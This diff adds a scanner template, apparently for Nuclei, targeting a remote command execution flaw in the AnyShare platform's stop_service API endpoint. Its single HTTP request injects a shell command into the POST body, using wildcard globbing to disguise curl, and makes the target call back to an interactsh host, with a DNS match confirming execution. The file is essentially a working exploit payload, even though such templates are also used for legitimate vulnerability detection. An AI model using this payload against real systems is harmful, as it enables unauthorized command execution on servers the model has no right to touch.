@@ -1,0 +1,21 @@
+id: aishu-AnyShare-stop_service-RCE
+
+info:
+  name: 爱数 AnyShare智能内容管理平台 stop_service 远程命令执行漏洞
+  author: aishu
+  severity: high
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /api/ServiceAgent/stop_service HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ["com;/u?r/b?n/c??l {{interactsh-url}}"]
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
